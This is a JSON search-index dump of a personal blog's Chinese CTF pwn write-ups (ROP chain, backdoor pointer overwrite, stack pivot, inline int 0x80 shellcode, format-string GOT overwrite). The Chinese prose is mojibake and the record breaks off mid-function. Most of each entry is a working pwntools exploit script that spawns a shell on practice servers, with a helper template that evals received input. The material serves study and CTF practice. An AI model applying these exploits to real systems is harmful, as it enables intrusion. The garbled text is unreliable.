[{"categories":null,"contents":"æœ¬æ ç›®ç”¨äºæ”¶é›†å„ç§æ‚é¡¹éšç¬”\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/posts/hello/","section":"posts","summary":"æœ¬æ ç›®ç”¨äºæ”¶é›†å„ç§æ‚é¡¹éšç¬”","tags":null,"title":"Hello"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nchecksec ida è§£é¢˜æ€è·¯å¾ˆç®€å•ï¼Œå…ˆåè°ƒç”¨win_function1ã€winfunction2ã€flagå‡½æ•°å³å¯ï¼Œé‡è¦çš„æ˜¯ropé“¾çš„é¡ºåºï¼Œ32ä½ç³»ç»Ÿæ¯”è¾ƒæ‚ä¹±\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./PicoCTF_2018_rop_chain\u0026#34; libc_name: str = \u0026#34;/home/ctf/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;28219\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def sendline_after_clean(content: bytes) -\u0026gt; None: p.clean() p.sendline(content) def interactive_after_clean() -\u0026gt; None: p.clean() p.interactive() #éœ€è¦è‡ªè¡Œè®¾å®šoffset offset:int = 0x18 + 0x4 payload = flat([ m_elf.sym[\u0026#39;win_function1\u0026#39;], m_elf.sym[\u0026#39;win_function2\u0026#39;], m_elf.sym[\u0026#39;flag\u0026#39;], -1163220307, -559039827 ]) payload = flat({offset : payload}) sendline_after_clean(payload) interactive_after_clean() è°ƒç”¨win1ï¼Œå› ä¸ºæ²¡æœ‰å‚æ•°ï¼Œæ‰€ä»¥ä¸ç”¨å®‰æ’æ ˆ ç­‰åˆ°win1ç»“æŸæ—¶ï¼Œæœ‰ä¸€æ¡retæŒ‡ä»¤ï¼Œä¼šå°†win2å¼¹å…¥EIP\nè€Œwin2æ˜¯ä¸€ä¸ªæœ‰å‚æ•°çš„å‡½æ•°ï¼Œä¸ºäº†è·å–æ ˆä¸­å‚æ•°ï¼Œ32ä½ç³»ç»Ÿçš„æ–¹æ³•æ˜¯ï¼Œä½¿ç”¨[ebp+8]ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œebpçš„å€¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næ‰€ä»¥å‚æ•°å’ŒæŒ‡ä»¤ä¹‹é—´è¦éš”å¼€\nflagå‡½æ•°åŒç†\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ checksec ida è§£é¢˜æ€è·¯å¾ˆç®€å•ï¼Œå…ˆåè°ƒç”¨win_function1ã€winfunction2ã€flagå‡½æ•°å³å¯ï¼Œé‡è¦çš„æ˜¯ropé“¾çš„é¡ºåºï¼Œ32ä½ç³»ç»Ÿæ¯”è¾ƒæ‚ä¹±","tags":["pwn","32ä½ç³»ç»Ÿä¼ å‚"],"title":"ã€32ä½ç³»ç»Ÿä¼ å‚ã€‘BUUCTF picoctf_2018_rop chain"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„C++è¯­æ³•ï¼Œè¿™é‡Œåº”è¯¥æœ‰ä¸¤ä¸ªç±»ï¼ŒAdminç»§æ‰¿è‡ªUserï¼š å…¶ä¸­æˆ‘ä»¬å‘ç°Admin::shellæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„åé—¨å‡½æ•°ï¼š é‚£ä¹ˆæˆ‘ä»¬åªè¦æƒ³åŠæ³•è°ƒç”¨è¿™ä¸ªå‡½æ•°å³å¯ æ•´ä¸ªç¨‹åºæœ‰ä¸¤ä¸ªè¾“å…¥ç‚¹ï¼š åªè¦å¯†ç æ­£ç¡®ï¼Œç¨‹åºå°±ä¼šè°ƒç”¨v8æŒ‡å‘çš„å‡½æ•° è€Œv8åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿv8çš„å€¼æ˜¯v3çš„æŒ‡é’ˆï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªè‡´å‘½æ¼æ´ï¼Œv2æ˜¯ä¸€ä¸ªæ ˆæŒ‡é’ˆè€Œä¸æ˜¯.bssèŠ‚çš„æŒ‡é’ˆã€‚æ‰€ä»¥å¦‚æœè¿”å›mainå‡½æ•°åå†è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œå°±å¯èƒ½æŠŠè¿™ä¸ªåœ°å€è¦†ç›–æ‰ æˆ‘ä»¬çœ‹çœ‹æ±‡ç¼–ä»£ç è¿™ä¸ªæ ˆæŒ‡é’ˆåœ¨å“ªé‡Œ çœ‹æ¥è¿™ä¸ªv2åœ¨[rbp+var_18]å¤„ï¼Œè€Œè¿™ä¸ªå€¼ï¼Œæˆ‘ä»¬åœ¨read_passwordä¸­æ˜¯å¯ä»¥è¦†ç›–çš„ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†å…¶è¦†ç›–ä¸ºAdmin::shelläº†\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./login\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25767\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... backdoor = 0x400E88 sendline_after_clean(\u0026#34;admin\u0026#34;) payload = flat([ \u0026#34;2jctf_pa5sw0rd\u0026#34;.ljust(0x60-0x18, \u0026#34;\\x00\u0026#34;), backdoor ]) sendline_after_clean(payload) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/c++pwnzjctf-2019login/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„C++è¯­æ³•ï¼Œè¿™é‡Œåº”è¯¥æœ‰ä¸¤ä¸ªç±»ï¼ŒAdminç»§æ‰¿è‡ªUserï¼š å…¶ä¸­æˆ‘ä»¬å‘ç°Admin::shellæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„åé—¨å‡½","tags":["pwn","C++Pwn"],"title":"ã€C++Pwnã€‘[ZJCTF 2019]Login"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  é™åˆ¶æº¢å‡ºçš„å­—ç¬¦åˆ°retåªèƒ½æœ‰ä¸€ä¸ªåœ°å€ï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œå…¸å‹æ ˆè¿ç§»\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./ciscn_s_4\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25030\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x28 backdoor = m_elf.sym[\u0026#39;hack\u0026#39;] payload = b\u0026#34;a\u0026#34;*0x27 + b\u0026#34;b\u0026#34; send_after_clean(payload, no_show=True) buf = recv_and_transform(\u0026#34;b\u0026#34;) - 0x38 leave_ret = 0x08048562 call_system = 0x8048559 payload = flat([ 0, call_system, buf + 4*3, \u0026#34;/bin/sh\\x00\u0026#34; ]).ljust(0x28, b\u0026#34;\\x00\u0026#34;) payload += flat([ buf, leave_ret ]) sendline_after_clean(payload, no_show=True) interactive_after_clean(no_show=True) å…¶ä¸­ï¼Œå› ä¸ºcallä¼šè‡ªåŠ¨å°†ä¸‹ä¸€æ¡æŒ‡ä»¤å…¥æ ˆï¼Œæ‰€ä»¥å°±ä¸ç”¨åœ¨æ ˆä¸­ç©ºå‡ºä¸€ä½ç»™retäº†ï¼Œbuf+4*3çš„ä½ç½®ä¼šè¢«è°ƒæ•´ä¸ºesp+8\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/call32%E6%A0%88%E8%BF%81%E7%A7%BBbuuctf-ciscn_2019_s_4/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  é™åˆ¶æº¢å‡ºçš„å­—ç¬¦åˆ°retåªèƒ½æœ‰ä¸€ä¸ªåœ°å€ï¼Œæ²¡æœ‰åé—¨å‡½æ•°ï¼Œå…¸å‹æ ˆè¿ç§» exp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool","tags":["pwn","32ä½ç³»ç»Ÿcall","æ ˆè¿ç§»"],"title":"ã€call32ã€‘ã€æ ˆè¿ç§»ã€‘BUUCTF ciscn_2019_s_4"},{"categories":["writeup"],"contents":"ã€Write-upã€‘BUUCTF others_shellcode åŸé¢˜é“¾æ¥\nã€Write-upã€‘BUUCTF others_shellcode checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  ç„¶åæˆ‘ä»¬çœ‹åˆ°å®ƒçš„getShellå‡½æ•°ï¼š\næˆ‘ä»¬çœ‹åˆ°å®ƒé‡Œé¢æœ‰ä¸€å¥å¾ˆå¥‡æ€ªçš„__asm { int 80h; LINUX - sys_execve }ï¼Œè¿™æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ\næˆ‘ä»¬æŒ‰ tab çœ‹ä¸€ä¸‹å®ƒå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼š\nè¿™é‡Œæˆ‘ä»¬å·²ç»çœ‹å‡ºä¸€ç‚¹ç«¯å€ªäº†ï¼Œæ²¡é”™ï¼Œè¿™ä¸€å¥å°±æ˜¯å†…è”æ±‡ç¼–ï¼ˆå†…è”æ±‡ç¼–ä½¿ç”¨â€œ__asmâ€ï¼ˆC++ï¼‰å’Œâ€œasmâ€ï¼ˆC å’Œ C++ï¼‰å…³é”®å­—å£°æ˜ï¼‰\nå…·ä½“å¯ä»¥çœ‹ä»¥ä¸‹æ¨æ–‡ï¼š\nMIPS æŒ‡ä»¤é›†ï¼šå†…åµŒæ±‡ç¼– asm è¯­æ³•ä»‹ç» C è¯­è¨€å†…åµŒæ±‡ç¼–**asm__**volatile__ C è¯­è¨€ ASM æ±‡ç¼–å†…åµŒè¯­æ³• è‡³äºint 80çš„ä½œç”¨ï¼Œè¯·å‚è€ƒæˆ‘å†™çš„è¿™ç¯‡ writeupçš„ç¬¬äºŒä¸ª exp\næ„å»º exp è¿™é¢˜æ ¹æœ¬ä¸éœ€è¦ expï¼Œç›´æ¥nc ç½‘å€ ç«¯å£å·å³å¯ï¼Œç¨‹åºä¼šè‡ªåŠ¨æ‰§è¡Œexecve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\nè¿™é¢˜çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯ä»‹ç»int 80çš„ä½œç”¨è¿˜æœ‰å†…è”æ±‡ç¼–\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/","section":"writeup","summary":"ã€Write-upã€‘BUUCTF others_shellcode åŸé¢˜é“¾æ¥ ã€Write-upã€‘BUUCTF others_shellcode checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ ida æŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»º exp checksec æŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file shell_asm [*] \u0026#39;/home/peterl/security/workspace/shell_asm/shell_asm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack:","tags":["pwn","Cå†…åµŒæ±‡ç¼–"],"title":"ã€Cå†…åµŒæ±‡ç¼–ã€‘others_shellcode"},{"categories":["writeup"],"contents":"æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å…¸å‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬gdbåˆ°printf(format);é‚£é‡Œçœ‹ä¸‹æ ˆï¼š å¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸Šå‚¨å­˜è¦å…ˆåæ‰ä¸€ä¸ªå­—ç¬¦æ‰åˆ°ç¬¬8ä¸ªå‚æ•°çš„ä½ç½® æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°åœ¨ç¬¬0x97ä¸ªå‚æ•°çš„ä½ç½®å­˜å‚¨äº†__libc_start_main+247çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å…¶è®¡ç®—å‡ºlibcçš„åŸºå€ é‚£ä¹ˆç­”æ¡ˆå°±å¾ˆç®€å•äº†ï¼Œæ”¹å†™printfçš„gotå€¼ä¸ºsystemå³å¯\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./axb_2019_fmt32\u0026#34; libc_name:str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;25269\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return 